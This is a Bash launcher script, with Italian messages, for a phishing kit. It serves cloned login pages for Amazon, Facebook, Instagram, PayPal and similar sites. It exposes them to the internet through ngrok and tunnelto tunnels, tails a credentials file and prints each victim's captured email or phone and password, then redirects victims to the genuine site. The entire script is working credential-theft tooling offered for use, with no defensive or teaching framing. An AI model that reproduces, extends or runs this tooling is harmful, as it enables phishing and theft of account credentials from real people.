#!/usr/bin/env bash

set -euo pipefail

ROOT_DIR="$(cd "$(dirname "$0")" && pwd)"
TEMPLATES_DIR="$ROOT_DIR/templates"
CRED_DIR="$ROOT_DIR/credenziali"
INDEX_PHP="$ROOT_DIR/index.php"
SERVER_PY="$ROOT_DIR/server.py"
NGROK_CMD="ngrok"
DEBUG_DIR="$ROOT_DIR/debug"

GREEN='\033[0;32m'
NC='\033[0m'

SUPPRESS_DUP_CREDS=${SUPPRESS_DUP_CREDS:-1}

LAST_CRED_KEY=""
DEBOUNCE_SECONDS=${DEBOUNCE_SECONDS:-2}
LAST_CRED_TS=0

PIDS=()

function cleanup() {
  if [ -f "$DEBUG_DIR/index.php.bak" ]; then
    mv -f "$DEBUG_DIR/index.php.bak" "$INDEX_PHP" || true
  fi
  if [ -p "$DEBUG_DIR/creds.fifo" ]; then
    rm -f "$DEBUG_DIR/creds.fifo" || true
  fi
  pkill -f "tail -n0 -F .*Credenziali_.*.txt" >/dev/null 2>&1 || true
  pkill -f "creds.fifo" >/dev/null 2>&1 || true
    for pid in "${PIDS[@]}"; do
      if [ -n "$pid" ] && kill -0 "$pid" 2>/dev/null; then
        kill "$pid" 2>/dev/null || true
      fi
    done
    pkill -f "ngrok" >/dev/null 2>&1 || true
    pkill -f "php -S localhost:8000" >/dev/null 2>&1 || true
    pkill -f "ssh -o StrictHostKeyChecking=no -R 80:localhost:8000 serveo.net" >/dev/null 2>&1 || true
    pkill -f "serveo.net" >/dev/null 2>&1 || true
    pkill -f "python3 .*server.py" >/dev/null 2>&1 || true
  sleep 1
  exit 0
}

  trap cleanup INT TERM EXIT

function print_header() {
  echo "-----------------------------------------"
  echo "$1"
  echo "-----------------------------------------"
}

print_header "Seleziona il sito template da servire"
templates=()
if [ -d "$TEMPLATES_DIR" ]; then
  while IFS= read -r -d $'\0' file; do
    templates+=("$(basename "$file")")
  done < <(find "$TEMPLATES_DIR" -maxdepth 1 -type f -name '*.html' -print0 2>/dev/null)
fi

if [ ${#templates[@]} -eq 0 ]; then
  echo "Nessun template trovato in $TEMPLATES_DIR"
  exit 1
fi

for i in "${!templates[@]}"; do
  idx=$((i+1))
  echo "[$idx] ${templates[i]}"
done

read -p "Numero scelta: " choice
re='^[0-9]+$'
if ! [[ $choice =~ $re ]] || [ "$choice" -lt 1 ] || [ "$choice" -gt ${#templates[@]} ]; then
  echo "Scelta non valida"
  exit 1
fi
sel_index=$((choice-1))
TEMPLATE_FILE="${templates[$sel_index]}"
SITE_NAME="${TEMPLATE_FILE%%.*}"

print_header "Scelta: $TEMPLATE_FILE (site: $SITE_NAME)"

if [ -f "$INDEX_PHP" ]; then
  mkdir -p "$DEBUG_DIR"
  if [ ! -f "$DEBUG_DIR/index.php.bak" ]; then
    cp "$INDEX_PHP" "$DEBUG_DIR/index.php.bak" || true
  fi
  awk -v url="http://127.0.0.1:5001" '{ if ($0 ~ /^\s*\$ngrok_url\s*=.*/) { print "\$ngrok_url = \047" url "\047;" } else { print $0 } }' "$INDEX_PHP" > "$DEBUG_DIR/index.php.tmp" && mv "$DEBUG_DIR/index.php.tmp" "$INDEX_PHP" || true
fi

mkdir -p "$CRED_DIR"
CREDENTIALS_FILE="$CRED_DIR/Credenziali_${SITE_NAME}.txt"

export TEMPLATE_NAME="$TEMPLATE_FILE"
export CREDENTIALS_FILE="$CREDENTIALS_FILE"

touch "$CREDENTIALS_FILE"

start_cred_watcher() {
  mkdir -p "$DEBUG_DIR"
  FIFO="$DEBUG_DIR/creds.fifo"
  if [ -p "$FIFO" ]; then
    rm -f "$FIFO" || true
  fi
  mkfifo "$FIFO"

  tail -n0 -F "$CREDENTIALS_FILE" > "$FIFO" 2>/dev/null &
  TAIL_PID=$!
  PIDS+=("$TAIL_PID")

  (
    while IFS= read -r line < "$FIFO"; do
      [ -z "$line" ] && continue
      email=$(echo "$line" | sed -n "s/.*Email\/Telefono:\s*\([^,]*\),\s*Password:\s*\(.*\)/\1/p")
      password=$(echo "$line" | sed -n "s/.*Email\/Telefono:\s*\([^,]*\),\s*Password:\s*\(.*\)/\2/p")
      if [ -z "$email" ] || [ -z "$password" ]; then
        email=$(echo "$line" | awk -F',' '{print $1}' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
        password=$(echo "$line" | awk -F',' '{print $2}' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
      fi
      email=$(echo "$email" | sed -E 's/^([^:]*:)?\s*//')
      password=$(echo "$password" | sed -E 's/^([^:]*:)?\s*//')

      norm_email=$(echo "$email" | tr '\r' '\n' | tr -s ' ' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | tr '[:upper:]' '[:lower:]')
      norm_pass=$(echo "$password" | tr '\r' '\n' | tr -s ' ' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' )
      key="${norm_email}||${norm_pass}"

      if [ "${SUPPRESS_DUP_CREDS}" = "1" ]; then
        if [ "$key" = "$LAST_CRED_KEY" ]; then
          continue
        fi
      fi
      LAST_CRED_KEY="$key"

      echo -e "${GREEN}Credenziali trovate${NC}"
      echo "username: $email"
      echo "password: $password"
    done
  ) &
  READER_PID=$!
  PIDS+=("$READER_PID")
}

start_cred_watcher
case "$SITE_NAME" in
  amazon)
    REDIRECT_URL="https://www.amazon.com"
    ;;
  Facebook|facebook)
    REDIRECT_URL="https://www.facebook.com"
    ;;
  insta|instagram)
    REDIRECT_URL="https://www.instagram.com"
    ;;
  paypal)
    REDIRECT_URL="https://www.paypal.com"
    ;;
  *)
    REDIRECT_URL="https://www.google.com"
    ;;
esac
export REDIRECT_URL

mkdir -p "$DEBUG_DIR"
cp "$INDEX_PHP" "$DEBUG_DIR/index.php.bak" || true

if ! command -v python3 >/dev/null 2>&1; then
  echo "python3 non trovato nel PATH. Installa Python3 prima di procedere." >&2
  exit 1
fi

if [ -f "$ROOT_DIR/.venv/bin/activate" ]; then
  echo "Attivo virtualenv locale .venv"
  source "$ROOT_DIR/.venv/bin/activate" || true
fi

if ! python3 -c "import flask" >/dev/null 2>&1; then
  cat <<'MSG'
Il modulo Python 'flask' non è installato nel tuo ambiente Python attuale.

Per evitare di modificare il Python gestito dal sistema, crea e usa un virtual environment locale e installa Flask lì:

  python3 -m venv .venv
  source .venv/bin/activate
  pip install --upgrade pip
  pip install flask

Poi rilancia questo script all'interno dell'ambiente virtuale (./start_tool.sh).

Se preferisci forzare l'installazione nel sistema (non raccomandato), puoi usare:
  python3 -m pip install --break-system-packages flask

MSG
  exit 1
fi

print_header "Avvio Flask server (server.py) sulla porta 5001"
mkdir -p "$DEBUG_DIR"
python3 "$SERVER_PY" > "$DEBUG_DIR/server.log" 2>&1 &
PIDS+=("$!")
sleep 1

print_header "Avvio ngrok sulla porta 5001"
$NGROK_CMD http 5001 --log=stdout > "$DEBUG_DIR/ngrok.log" 2>&1 &
PIDS+=("$!")

NGROK_URL=""
for i in {1..20}; do
  sleep 1
  NGROK_JSON=$(curl -s http://127.0.0.1:4040/api/tunnels || true)
  if [ -n "$NGROK_JSON" ]; then
    NGROK_URL=$(echo "$NGROK_JSON" | python3 -c "import sys,json
d=sys.stdin.read()
try:
  obj=json.loads(d)
  for t in obj.get('tunnels',[]):
    pu=t.get('public_url')
    if pu and ('ngrok' in pu or 'ngrok-free' in pu):
      print(pu)
      break
except:
  pass
") || true
  fi
  if [ -n "$NGROK_URL" ]; then
    break
  fi
done

if [ -z "$NGROK_URL" ]; then
  if [ -f "$DEBUG_DIR/ngrok.log" ]; then
    NGROK_URL=$(grep -Eo "https?://[^\"']+ngrok[^\"']+" "$DEBUG_DIR/ngrok.log" | head -n1 || true)
  fi
fi

export NGROK_URL

if [ -z "$NGROK_URL" ]; then
  echo "Non sono riuscito a leggere l'URL di ngrok automaticamente; controlla $ROOT_DIR/ngrok.log"
else
  if [ -f "$INDEX_PHP" ]; then
    if [ ! -f "$DEBUG_DIR/index.php.bak" ]; then
      cp "$INDEX_PHP" "$DEBUG_DIR/index.php.bak" || true
    fi
    LC_ALL=C sed -E "s@\$ngrok_url\s*=\s*'[^']*'\s*;@\$ngrok_url = '$NGROK_URL';@" "$INDEX_PHP" > "$DEBUG_DIR/index.php.tmp" || true
    if [ -s "$DEBUG_DIR/index.php.tmp" ]; then
      mv "$DEBUG_DIR/index.php.tmp" "$INDEX_PHP" || true
      echo "[INFO] Wrote NGROK_URL=$NGROK_URL into $INDEX_PHP" >> "$DEBUG_DIR/ngrok_replace.log" || true
      echo "[INFO] Wrote NGROK_URL=$NGROK_URL into $INDEX_PHP"
    else
      echo "[WARN] sed replace produced empty tmp; not overwriting $INDEX_PHP" >> "$DEBUG_DIR/ngrok_replace.log" || true
      echo "[WARN] sed replace produced empty tmp; not overwriting $INDEX_PHP"
    fi
  fi
fi

if [ -z "$NGROK_URL" ] && [ -f "$INDEX_PHP" ]; then
  NGROK_URL='http://127.0.0.1:5001'
  LC_ALL=C sed -E "s@\$ngrok_url\s*=\s*'[^']*'\s*;@\$ngrok_url = '$NGROK_URL';@" "$INDEX_PHP" > "$DEBUG_DIR/index.php.tmp" || true
  if [ -s "$DEBUG_DIR/index.php.tmp" ]; then
    mv "$DEBUG_DIR/index.php.tmp" "$INDEX_PHP" || true
    echo "[INFO] No NGROK_URL detected: set fallback http://127.0.0.1:5001 in $INDEX_PHP" >> "$DEBUG_DIR/ngrok_replace.log" || true
    echo "[INFO] Set fallback http://127.0.0.1:5001 in $INDEX_PHP"
  else
    echo "[WARN] sed fallback produced empty tmp; not overwriting $INDEX_PHP" >> "$DEBUG_DIR/ngrok_replace.log" || true
    echo "[WARN] sed fallback produced empty tmp; not overwriting $INDEX_PHP"
  fi
fi

print_header "Avvio PHP server su localhost:8000"
  if command -v php >/dev/null 2>&1; then
  if ! php -l "$INDEX_PHP" > /dev/null 2>&1; then
    echo "Errore di sintassi in $INDEX_PHP. Ecco il dettaglio:"
    php -l "$INDEX_PHP" || true
    if [ -f "$DEBUG_DIR/index.php.bak" ]; then
      mv -f "$DEBUG_DIR/index.php.bak" "$INDEX_PHP"
      echo "Ripristinato $INDEX_PHP da backup."
    fi
    cleanup
  fi
else
  echo "php non trovato nel PATH: non posso controllare la sintassi di $INDEX_PHP"
fi
php -S localhost:8000 > "$DEBUG_DIR/php.log" 2>&1 &
PIDS+=("$!")
sleep 1

print_header "Avvio tunnelto sulla porta 8000"
TUNNELTO_CMD="tunnelto"
if ! command -v "$TUNNELTO_CMD" >/dev/null 2>&1; then
  echo "tunnelto non trovato nel PATH; salto la creazione del tunnel pubblico (usa ngrok o installa tunnelto)."
else
  mkdir -p "$DEBUG_DIR"
  if [ -n "${TUNNELTO_KEY:-}" ]; then
    $TUNNELTO_CMD --port 8000 --key "$TUNNELTO_KEY" > "$DEBUG_DIR/tunnelto.log" 2>&1 &
  else
    $TUNNELTO_CMD --port 8000 > "$DEBUG_DIR/tunnelto.log" 2>&1 &
  fi
  PIDS+=("$!")

  TUNNELTO_URL=""
  for i in {1..20}; do
    sleep 1
    if [ -f "$DEBUG_DIR/tunnelto.log" ]; then
      TUNNELTO_URL=$(grep -Eo "https?://[^[:space:]]+" "$DEBUG_DIR/tunnelto.log" | grep -E "tunn?\.dev|tunnelto|tunnelto\.dev|tunn\.dev" -m1 || true)
      if [ -z "$TUNNELTO_URL" ]; then
        TUNNELTO_URL=$(grep -Eo "https?://[^[:space:]]+" "$DEBUG_DIR/tunnelto.log" | head -n1 || true)
      fi
    fi
    if [ -n "$TUNNELTO_URL" ]; then
      break
    fi
  done

  if [ -n "$TUNNELTO_URL" ]; then
    echo -e "${GREEN}Apri questo URL pubblico nel browser:${NC} $TUNNELTO_URL"
    export TUNNELTO_URL
  else
    echo "Non sono riuscito a estrarre l'URL di tunnelto automaticamente. Controlla $DEBUG_DIR/tunnelto.log"
  fi
fi

trap cleanup INT TERM

while true; do
  sleep 1
done
